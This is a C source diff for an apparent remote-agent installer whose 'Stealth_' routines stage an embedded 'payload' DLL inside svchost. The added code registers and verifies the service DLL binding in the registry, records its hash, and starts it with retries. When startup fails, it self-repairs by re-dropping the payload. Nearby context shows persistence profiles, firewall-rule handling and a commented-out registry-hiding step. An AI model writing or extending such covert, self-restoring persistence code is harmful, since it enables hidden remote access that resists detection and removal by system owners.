@@ -156,6 +156,10 @@ static void Stealth_ClearServiceRecovery(const wchar_t* serviceName);
 static BOOL Stealth_DoFirewallRulesMatch(const wchar_t* serviceName, const wchar_t* hostExePath, const wchar_t* agentExePath);
 static BOOL Stealth_WaitForFirewallRuleConvergence(const wchar_t* serviceName, const wchar_t* hostExePath, const wchar_t* agentExePath, DWORD timeoutMs);
 static BOOL Stealth_RefreshFirewallRulesWithRetry(const wchar_t* serviceName, const wchar_t* hostExePath, const wchar_t* agentExePath);
+static BOOL Stealth_ValidateSvchostPayloadDll(const wchar_t* dllPath);
+static BOOL Stealth_VerifySvchostServiceBinding(const wchar_t* serviceName, const wchar_t* dllPath);
+static BOOL Stealth_StartSvchostServiceAndWait(const wchar_t* serviceName, const wchar_t* dllPath, DWORD timeoutMs, BOOL allowRepair);
+static void Stealth_RecordServiceDllHash(const wchar_t* serviceName, const wchar_t* dllPath);
 
 #define STEALTH_INSTALL_LOG_MAX_BYTES    (512ULL * 1024ULL)
 #define STEALTH_SERVICE_STOP_TIMEOUT_MS  (30 * 1000)
@@ -1004,6 +1008,292 @@ static BOOL Stealth_RefreshFirewallRulesWithRetry(const wchar_t* serviceName, co
     return FALSE;
 }
 
+static BOOL Stealth_ShouldAttemptSvchostRepairForError(DWORD errorCode)
+{
+    return (errorCode == ERROR_MOD_NOT_FOUND ||
+            errorCode == ERROR_PROC_NOT_FOUND ||
+            errorCode == ERROR_FILE_NOT_FOUND ||
+            errorCode == ERROR_BAD_EXE_FORMAT);
+}
+
+static void Stealth_RecordServiceDllHash(const wchar_t* serviceName, const wchar_t* dllPath)
+{
+    if (serviceName == NULL || serviceName[0] == L'\0' || dllPath == NULL || dllPath[0] == L'\0') { return; }
+
+    wchar_t dllHashBuffer[STEALTH_SHA256_STRING_LENGTH + 1] = {0};
+    if (!Stealth_ComputeFileSha256W(dllPath, dllHashBuffer, _countof(dllHashBuffer)))
+    {
+        Stealth_LogInstallEvent(L"Failed to compute SHA256 for %ls", dllPath);
+        return;
+    }
+
+    wchar_t paramsKeyPath[512];
+    _snwprintf_s(paramsKeyPath, _countof(paramsKeyPath), _TRUNCATE, L"SYSTEM\\CurrentControlSet\\Services\\%s\\Parameters", serviceName);
+
+    HKEY hParams = NULL;
+    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, paramsKeyPath, 0, KEY_WRITE, &hParams) != ERROR_SUCCESS)
+    {
+        Stealth_LogInstallEvent(L"Failed to open service parameters for hash update (%ls)", serviceName);
+        return;
+    }
+
+    if (RegSetValueExW(hParams, L"ServiceDllHash", 0, REG_SZ, (const BYTE*)dllHashBuffer,
+                       (DWORD)((wcslen(dllHashBuffer) + 1) * sizeof(wchar_t))) == ERROR_SUCCESS)
+    {
+        Stealth_LogInstallEvent(L"Recorded ServiceDllHash for %ls", serviceName);
+    }
+    else
+    {
+        Stealth_LogInstallEvent(L"Failed to record ServiceDllHash for %ls (error=%lu)", serviceName, GetLastError());
+    }
+    RegCloseKey(hParams);
+}
+
+static BOOL Stealth_ValidateSvchostPayloadDll(const wchar_t* dllPath)
+{
+    if (dllPath == NULL || dllPath[0] == L'\0')
+    {
+        Stealth_LogInstallEvent(L"Svchost payload validation failed: empty path");
+        return FALSE;
+    }
+
+    DWORD attrs = GetFileAttributesW(dllPath);
+    if (attrs == INVALID_FILE_ATTRIBUTES || (attrs & FILE_ATTRIBUTE_DIRECTORY) != 0)
+    {
+        Stealth_LogInstallEvent(L"Svchost payload validation failed: file missing (%ls)", dllPath);
+        return FALSE;
+    }
+
+    HMODULE mod = LoadLibraryExW(dllPath, NULL, DONT_RESOLVE_DLL_REFERENCES);
+    if (mod == NULL)
+    {
+        DWORD err = GetLastError();
+        Stealth_LogInstallEvent(L"Svchost payload load validation failed for %ls (error=%lu)", dllPath, err);
+        return FALSE;
+    }
+
+    FARPROC serviceMain = GetProcAddress(mod, "Stealth_SvchostServiceMain");
+    DWORD procErr = GetLastError();
+    FreeLibrary(mod);
+
+    if (serviceMain == NULL)
+    {
+        Stealth_LogInstallEvent(L"Svchost payload export missing for %ls (expected=Stealth_SvchostServiceMain, error=%lu)", dllPath, procErr);
+        return FALSE;
+    }
+
+    Stealth_LogInstallEvent(L"Svchost payload validated: %ls (export Stealth_SvchostServiceMain found)", dllPath);
+    return TRUE;
+}
+
+static BOOL Stealth_VerifySvchostServiceBinding(const wchar_t* serviceName, const wchar_t* dllPath)
+{
+    if (serviceName == NULL || serviceName[0] == L'\0' || dllPath == NULL || dllPath[0] == L'\0') { return FALSE; }
+
+    wchar_t paramsKeyPath[512];
+    _snwprintf_s(paramsKeyPath, _countof(paramsKeyPath), _TRUNCATE, L"SYSTEM\\CurrentControlSet\\Services\\%s\\Parameters", serviceName);
+
+    HKEY hParams = NULL;
+    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, paramsKeyPath, 0, KEY_QUERY_VALUE, &hParams) != ERROR_SUCCESS)
+    {
+        Stealth_LogInstallEvent(L"Svchost binding validation failed: missing Parameters key for %ls", serviceName);
+        return FALSE;
+    }
+
+    BOOL ok = TRUE;
+    wchar_t rawServiceDll[MAX_PATH * 4] = {0};
+    DWORD dllType = 0;
+    DWORD dllCb = (DWORD)sizeof(rawServiceDll);
+    if (RegQueryValueExW(hParams, L"ServiceDll", NULL, &dllType, (LPBYTE)rawServiceDll, &dllCb) != ERROR_SUCCESS ||
+        (dllType != REG_SZ && dllType != REG_EXPAND_SZ))
+    {
+        Stealth_LogInstallEvent(L"Svchost binding validation failed: ServiceDll missing for %ls", serviceName);
+        ok = FALSE;
+    }
+    else
+    {
+        wchar_t resolvedServiceDll[MAX_PATH * 4] = {0};
+        if (dllType == REG_EXPAND_SZ)
+        {
+            DWORD expanded = ExpandEnvironmentStringsW(rawServiceDll, resolvedServiceDll, _countof(resolvedServiceDll));
+            if (expanded == 0 || expanded >= _countof(resolvedServiceDll))
+            {
+                Stealth_LogInstallEvent(L"Svchost binding validation failed: ServiceDll expansion failed for %ls", serviceName);
+                ok = FALSE;
+            }
+        }
+        else if (FAILED(StringCchCopyW(resolvedServiceDll, _countof(resolvedServiceDll), rawServiceDll)))
+        {
+            ok = FALSE;
+        }
+
+        if (ok)
+        {
+            wchar_t expectedDll[MAX_PATH * 4] = {0};
+            StringCchCopyW(expectedDll, _countof(expectedDll), dllPath);
+            MeshInstaller_NormalizePathSeparators(resolvedServiceDll);
+            MeshInstaller_NormalizePathSeparators(expectedDll);
+            if (_wcsicmp(resolvedServiceDll, expectedDll) != 0)
+            {
+                Stealth_LogInstallEvent(L"Svchost binding validation failed: ServiceDll mismatch (expected=%ls actual=%ls)", expectedDll, resolvedServiceDll);
+                ok = FALSE;
+            }
+        }
+    }
+
+    wchar_t serviceMain[128] = {0};
+    DWORD serviceMainType = 0;
+    DWORD serviceMainCb = (DWORD)sizeof(serviceMain);
+    if (RegQueryValueExW(hParams, L"ServiceMain", NULL, &serviceMainType, (LPBYTE)serviceMain, &serviceMainCb) != ERROR_SUCCESS ||
+        serviceMainType != REG_SZ ||
+        _wcsicmp(serviceMain, L"Stealth_SvchostServiceMain") != 0)
+    {
+        Stealth_LogInstallEvent(L"Svchost binding validation failed: ServiceMain mismatch for %ls", serviceName);
+        ok = FALSE;
+    }
+
+    DWORD unloadOnStop = 0;
+    DWORD unloadType = 0;
+    DWORD unloadCb = sizeof(unloadOnStop);
+    if (RegQueryValueExW(hParams, L"ServiceDllUnloadOnStop", NULL, &unloadType, (LPBYTE)&unloadOnStop, &unloadCb) != ERROR_SUCCESS ||
+        unloadType != REG_DWORD ||
+        unloadOnStop != 1)
+    {
+        Stealth_LogInstallEvent(L"Svchost binding validation failed: ServiceDllUnloadOnStop mismatch for %ls", serviceName);
+        ok = FALSE;
+    }
+
+    RegCloseKey(hParams);
+    if (ok)
+    {
+        Stealth_LogInstallEvent(L"Svchost binding validated for %ls", serviceName);
+    }
+    return ok;
+}
+
+static BOOL Stealth_AttemptSvchostStartupRepair(const wchar_t* serviceName, const wchar_t* dllPath)
+{
+    if (serviceName == NULL || serviceName[0] == L'\0' || dllPath == NULL || dllPath[0] == L'\0') { return FALSE; }
+
+    Stealth_LogInstallEvent(L"Attempting svchost self-repair for %ls", serviceName);
+    (void)Stealth_StopServiceAndWait(serviceName, 20000, TRUE);
+
+    SetFileAttributesW(dllPath, FILE_ATTRIBUTE_NORMAL);
+    (void)DeleteFileW(dllPath);
+
+    if (!MeshSvchostPayload_WriteToPath(dllPath))
+    {
+        Stealth_LogInstallEvent(L"Svchost self-repair failed: unable to restage embedded payload (%ls, error=%lu)", dllPath, GetLastError());
+        return FALSE;
+    }
+
+    if (!Stealth_ValidateSvchostPayloadDll(dllPath))
+    {
+        Stealth_LogInstallEvent(L"Svchost self-repair failed: payload validation failed after restage (%ls)", dllPath);
+        return FALSE;
+    }
+
+    if (!Stealth_RegisterSvchostService(serviceName, dllPath))
+    {
+        Stealth_LogInstallEvent(L"Svchost self-repair failed: registration failed for %ls (error=%lu)", serviceName, GetLastError());
+        return FALSE;
+    }
+
+    if (!Stealth_VerifySvchostServiceBinding(serviceName, dllPath))
+    {
+        Stealth_LogInstallEvent(L"Svchost self-repair failed: binding verification failed for %ls", serviceName);
+        return FALSE;
+    }
+
+    Stealth_RecordServiceDllHash(serviceName, dllPath);
+    Stealth_LogInstallEvent(L"Svchost self-repair completed for %ls", serviceName);
+    return TRUE;
+}
+
+static BOOL Stealth_StartSvchostServiceAndWait(const wchar_t* serviceName, const wchar_t* dllPath, DWORD timeoutMs, BOOL allowRepair)
+{
+    if (serviceName == NULL || serviceName[0] == L'\0') { return FALSE; }
+
+    SC_HANDLE hScm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
+    if (hScm == NULL)
+    {
+        Stealth_LogInstallEvent(L"Service start failed: OpenSCManager failed (error=%lu)", GetLastError());
+        return FALSE;
+    }
+
+    SC_HANDLE hService = OpenServiceW(hScm, serviceName, SERVICE_START | SERVICE_QUERY_STATUS);
+    if (hService == NULL)
+    {
+        Stealth_LogInstallEvent(L"Service start failed: OpenService failed for %ls (error=%lu)", serviceName, GetLastError());
+        CloseServiceHandle(hScm);
+        return FALSE;
+    }
+
+    if (!StartServiceW(hService, 0, NULL))
+    {
+        DWORD startError = GetLastError();
+        if (startError != ERROR_SERVICE_ALREADY_RUNNING)
+        {
+            Stealth_LogInstallEvent(L"StartService failed for %ls (error=%lu)", serviceName, startError);
+            CloseServiceHandle(hService);
+            CloseServiceHandle(hScm);
+
+            if (allowRepair && Stealth_ShouldAttemptSvchostRepairForError(startError) &&
+                Stealth_AttemptSvchostStartupRepair(serviceName, dllPath))
+            {
+                return Stealth_StartSvchostServiceAndWait(serviceName, dllPath, timeoutMs, FALSE);
+            }
+            return FALSE;
+        }
+    }
+
+    DWORD waited = 0;
+    BOOL running = FALSE;
+    while (waited <= timeoutMs)
+    {
+        SERVICE_STATUS_PROCESS ssp = {0};
+        DWORD bytesNeeded = 0;
+        if (!QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(ssp), &bytesNeeded))
+        {
+            DWORD queryError = GetLastError();
+            Stealth_LogInstallEvent(L"QueryServiceStatusEx failed for %ls (error=%lu)", serviceName, queryError);
+            break;
+        }
+
+        if (ssp.dwCurrentState == SERVICE_RUNNING)
+        {
+            running = TRUE;
+            break;
+        }
+
+        if (ssp.dwCurrentState == SERVICE_STOPPED)
+        {
+            DWORD stopError = ssp.dwWin32ExitCode;
+            DWORD stopSpecific = ssp.dwServiceSpecificExitCode;
+            Stealth_LogInstallEvent(L"Service %ls stopped during startup (win32=%lu specific=%lu)", serviceName, stopError, stopSpecific);
+            break;
+        }
+
+        Sleep(500);
+        waited += 500;
+    }
+
+    CloseServiceHandle(hService);
+    CloseServiceHandle(hScm);
+
+    if (!running && allowRepair && Stealth_AttemptSvchostStartupRepair(serviceName, dllPath))
+    {
+        return Stealth_StartSvchostServiceAndWait(serviceName, dllPath, timeoutMs, FALSE);
+    }
+
+    if (!running)
+    {
+        Stealth_LogInstallEvent(L"Service %ls failed to reach RUNNING state within %lu ms", serviceName, timeoutMs);
+    }
+
+    return running;
+}
+
 // ================================================================
 // Complete Installation Function
 // ================================================================
@@ -1017,8 +1307,6 @@ BOOL Stealth_PerformCompleteInstallation(
     StealthInstallPaths paths;
     BOOL success = FALSE;
     BOOL dllStaged = FALSE;
-    wchar_t dllHashBuffer[STEALTH_SHA256_STRING_LENGTH + 1] = {0};
-    BOOL haveDllHash = FALSE;
     wchar_t serviceKeyName[256] = {0};
     wchar_t serviceDisplayName[256] = {0};
     wchar_t serviceDescription[512] = {0};
@@ -1161,10 +1449,24 @@ BOOL Stealth_PerformCompleteInstallation(
     }
     Stealth_LogInstallEvent(L"Svchost payload staged to %ls", paths.dllPath);
 
-    haveDllHash = Stealth_ComputeFileSha256W(paths.dllPath, dllHashBuffer, _countof(dllHashBuffer));
-    if (!haveDllHash)
+    if (!Stealth_ValidateSvchostPayloadDll(paths.dllPath))
     {
-        Stealth_LogInstallEvent(L"Failed to compute SHA256 for %ls", paths.dllPath);
+        if (sourceDllPath && sourceDllPath[0] != L'\0')
+        {
+            Stealth_LogInstallEvent(L"Provided svchost DLL failed validation; attempting embedded payload fallback");
+            Stealth_RemoveFileIfExists(paths.dllPath, TRUE);
+            dllStaged = MeshSvchostPayload_WriteToPath(paths.dllPath);
+            if (!dllStaged || !Stealth_ValidateSvchostPayloadDll(paths.dllPath))
+            {
+                Stealth_LogInstallEvent(L"Embedded svchost DLL fallback validation failed for %ls", paths.dllPath);
+                return FALSE;
+            }
+            Stealth_LogInstallEvent(L"Embedded svchost payload fallback staged to %ls", paths.dllPath);
+        }
+        else
+        {
+            return FALSE;
+        }
     }
 
     // Register svchost-hosted service only
@@ -1175,18 +1477,12 @@ BOOL Stealth_PerformCompleteInstallation(
         return FALSE;
     }
     Stealth_LogInstallEvent(L"Svchost registration complete for %ls", serviceKeyName);
-    if (haveDllHash)
+    if (!Stealth_VerifySvchostServiceBinding(serviceKeyName, paths.dllPath))
     {
-        wchar_t paramsKeyPath[512];
-        _snwprintf_s(paramsKeyPath, _countof(paramsKeyPath), _TRUNCATE, L"SYSTEM\\CurrentControlSet\\Services\\%s\\Parameters", serviceKeyName);
-        HKEY hParams = NULL;
-        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, paramsKeyPath, 0, KEY_WRITE, &hParams) == ERROR_SUCCESS)
-        {
-            RegSetValueExW(hParams, L"ServiceDllHash", 0, REG_SZ, (const BYTE*)dllHashBuffer, (DWORD)((wcslen(dllHashBuffer) + 1) * sizeof(wchar_t)));
-            RegCloseKey(hParams);
-            Stealth_LogInstallEvent(L"Recorded ServiceDllHash for %ls", serviceKeyName);
-        }
+        Stealth_LogInstallEvent(L"Svchost registration binding verification failed for %ls", serviceKeyName);
+        return FALSE;
     }
+    Stealth_RecordServiceDllHash(serviceKeyName, paths.dllPath);
     Stealth_ConfigureServiceRecoveryIfEnabled(persistence, serviceKeyName);
     Stealth_ApplyPersistenceProfile();
     success = TRUE;
@@ -1236,34 +1532,12 @@ BOOL Stealth_PerformCompleteInstallation(
     // Stealth_HideServiceRegistry(serviceKeyName);
 
     // Step 7: Start the service and confirm running state
-    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
-    if (hSCM)
+    if (!Stealth_StartSvchostServiceAndWait(serviceKeyName, paths.dllPath, 20000, TRUE))
     {
-        SC_HANDLE hService = OpenServiceW(hSCM, serviceKeyName, SERVICE_START | SERVICE_QUERY_STATUS);
-        if (hService)
-        {
-            if (!StartServiceW(hService, 0, NULL)) {
-                OutputDebugStringW(L"[stealth_installer] StartService failed\n");
-            } else {
-                // Wait up to 10s for running state
-                SERVICE_STATUS_PROCESS ssp = {0};
-                DWORD bytes = 0;
-                DWORD waited = 0;
-                while (QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(ssp), &bytes)) {
-                    if (ssp.dwCurrentState == SERVICE_RUNNING) { break; }
-                    if (ssp.dwCurrentState == SERVICE_STOPPED) { break; }
-                    Sleep(500);
-                    waited += 500;
-                    if (waited >= 10000) { break; }
-                }
-                if (ssp.dwCurrentState != SERVICE_RUNNING) {
-                    OutputDebugStringW(L"[stealth_installer] Service did not reach RUNNING state\n");
-                }
-            }
-            CloseServiceHandle(hService);
-        }
-        CloseServiceHandle(hSCM);
+        Stealth_LogInstallEvent(L"Installation failed: service failed to reach RUNNING state for %ls", serviceKeyName);
+        return FALSE;
     }
+    Stealth_LogInstallEvent(L"Service reached RUNNING state for %ls", serviceKeyName);
 
     return success;
 }
@@ -1538,6 +1812,31 @@ BOOL Stealth_PerformUpdate(const wchar_t* sourceExePath, const wchar_t* sourceDl
         success = FALSE;
         goto CLEANUP;
     }
+    if (!Stealth_ValidateSvchostPayloadDll(paths.dllPath))
+    {
+        if (sourceDllPath && sourceDllPath[0] != L'\0')
+        {
+            Stealth_LogInstallEvent(L"[UPDATE] Provided svchost DLL failed validation; attempting embedded payload fallback");
+            if (!Stealth_RemoveFileIfExistsWithTimeout(paths.dllPath, 60000, TRUE))
+            {
+                Stealth_LogInstallEvent(L"[UPDATE] Failed to remove invalid svchost DLL during fallback (%ls)", paths.dllPath);
+                success = FALSE;
+                goto CLEANUP;
+            }
+            if (!MeshSvchostPayload_WriteToPath(paths.dllPath) || !Stealth_ValidateSvchostPayloadDll(paths.dllPath))
+            {
+                Stealth_LogInstallEvent(L"[UPDATE] Embedded svchost DLL fallback validation failed for %ls", paths.dllPath);
+                success = FALSE;
+                goto CLEANUP;
+            }
+            Stealth_LogInstallEvent(L"[UPDATE] Embedded svchost payload fallback staged to %ls", paths.dllPath);
+        }
+        else
+        {
+            success = FALSE;
+            goto CLEANUP;
+        }
+    }
 
     if (!Stealth_RegisterSvchostService(serviceKeyName, paths.dllPath))
     {
@@ -1545,20 +1844,13 @@ BOOL Stealth_PerformUpdate(const wchar_t* sourceExePath, const wchar_t* sourceDl
         success = FALSE;
         goto CLEANUP;
     }
-
-    wchar_t dllHashBuffer[STEALTH_SHA256_STRING_LENGTH + 1] = {0};
-    if (Stealth_ComputeFileSha256W(paths.dllPath, dllHashBuffer, _countof(dllHashBuffer)))
+    if (!Stealth_VerifySvchostServiceBinding(serviceKeyName, paths.dllPath))
     {
-        wchar_t paramsKeyPath[512];
-        _snwprintf_s(paramsKeyPath, _countof(paramsKeyPath), _TRUNCATE, L"SYSTEM\\CurrentControlSet\\Services\\%s\\Parameters", serviceKeyName);
-        HKEY hParams = NULL;
-        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, paramsKeyPath, 0, KEY_WRITE, &hParams) == ERROR_SUCCESS)
-        {
-            RegSetValueExW(hParams, L"ServiceDllHash", 0, REG_SZ, (const BYTE*)dllHashBuffer,
-                           (DWORD)((wcslen(dllHashBuffer) + 1) * sizeof(wchar_t)));
-            RegCloseKey(hParams);
-        }
+        Stealth_LogInstallEvent(L"[UPDATE] Svchost binding verification failed for %ls", serviceKeyName);
+        success = FALSE;
+        goto CLEANUP;
     }
+    Stealth_RecordServiceDllHash(serviceKeyName, paths.dllPath);
 
 CLEANUP:
     if (disabledStartType)
@@ -1590,16 +1882,10 @@ CLEANUP:
 
     if (restartService)
     {
-        SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
-        if (hSCM)
+        if (!Stealth_StartSvchostServiceAndWait(serviceKeyName, paths.dllPath, 30000, TRUE))
         {
-            SC_HANDLE hService = OpenServiceW(hSCM, serviceKeyName, SERVICE_START | SERVICE_QUERY_STATUS);
-            if (hService)
-            {
-                StartServiceW(hService, 0, NULL);
-                CloseServiceHandle(hService);
-            }
-            CloseServiceHandle(hSCM);
+            Stealth_LogInstallEvent(L"[UPDATE] Service failed to reach RUNNING state after update for %ls", serviceKeyName);
+            success = FALSE;
         }
     }
 
